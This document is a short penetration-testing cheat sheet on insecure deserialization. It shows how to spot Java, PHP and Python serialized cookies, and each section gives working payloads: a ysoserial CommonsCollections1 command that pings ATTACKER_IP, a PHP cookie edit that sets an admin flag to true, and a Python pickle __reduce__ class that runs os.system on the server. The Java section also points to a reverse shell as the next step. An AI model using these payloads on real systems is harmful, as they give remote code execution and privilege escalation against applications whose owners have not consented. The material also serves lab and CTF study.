# DESERIALIZATION

### Identify serialized data

Recognize serialization formats — Each format has different attacks

```bash
Look for base64 blobs in cookies/params
Java: rO0AB (base64), AC ED 00 05 (hex)
PHP: O:4:"User":2:{...}
Python: (pickle)
```

<details>
<summary>Example Output</summary>

```
Cookie: session=rO0ABXNyABFq... (Java - starts with rO0AB)
Cookie: session=Tzo0OiJVc2VyIjoyOntz... (PHP - starts with O:4:)
Cookie: session=gASVKAAAA... (Python pickle - starts with gASV)
(Identify format, then craft exploit)
```
</details>

---

### Java deserialization

Generate Java payload — If Java app with known gadgets

```bash
ysoserial.jar CommonsCollections1 'command'
```

<details>
<summary>Example Output</summary>

```
java -jar ysoserial.jar CommonsCollections1 'ping ATTACKER_IP' | base64

Replace cookie with payload
Attacker: tcpdump -i tun0 icmp
Got ICMP from 10.10.10.5
(Confirmed RCE, now use reverse shell)
```
</details>

---

### PHP deserialization

Modify serialized cookie — PHP object injection

```bash
Craft serialized PHP object with __wakeup or __destruct
```

<details>
<summary>Example Output</summary>

```
Original: O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:0;}
Modified: O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}

Set admin=true via deserialization
(Or exploit __wakeup/__destruct for RCE)
```
</details>

---

### Python pickle

Python unpickle RCE — Flask/Django session cookies

```bash
import pickle; pickle.loads(malicious_data)
```

<details>
<summary>Example Output</summary>

```
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())

Send as session cookie
Server unpickles -> executes os.system('id')
(RCE via Python deserialization)
```
</details>

---
